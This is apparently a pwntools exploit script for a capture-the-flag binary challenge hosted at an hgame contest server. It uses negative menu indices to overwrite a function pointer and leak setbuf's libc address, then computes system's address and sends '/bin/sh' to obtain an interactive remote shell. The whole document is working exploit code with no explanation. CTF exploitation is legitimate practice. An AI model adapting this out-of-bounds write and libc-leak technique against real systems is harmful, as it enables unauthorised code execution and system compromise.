from pwn import * 
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux')
context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
# r = process("./vuln")
r = connect('week-1.hgame.lwsec.cn',32417)#远程连接
libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")

# gdb.attach(r,'b* 0x401215')
# pause()

r.sendlineafter(b"please choose one.\n",b'-6')
r.sendafter(b"please input your name\n",p64(elf.symbols['vuln']))
r.sendlineafter(b"please choose one.\n",b'-8')
r.sendafter(b"please input your name\n",b'\xd0')
r.recvuntil(b'Your name is ')

response =r.recv(6)
setbuf_addr = u64(response.ljust(8,b'\x00')) 
libc_base = setbuf_addr - libc.symbols['setbuf']
system_addr =  libc_base + libc.symbols['system']

print(response)
print(hex(setbuf_addr))
print(hex(libc.symbols['setbuf']))
print(hex(system_addr))
r.sendlineafter(b"please choose one.\n",b'-9')
r.sendafter(b'name',b'/bin/sh\x00'+p64(system_addr))
r.interactive()

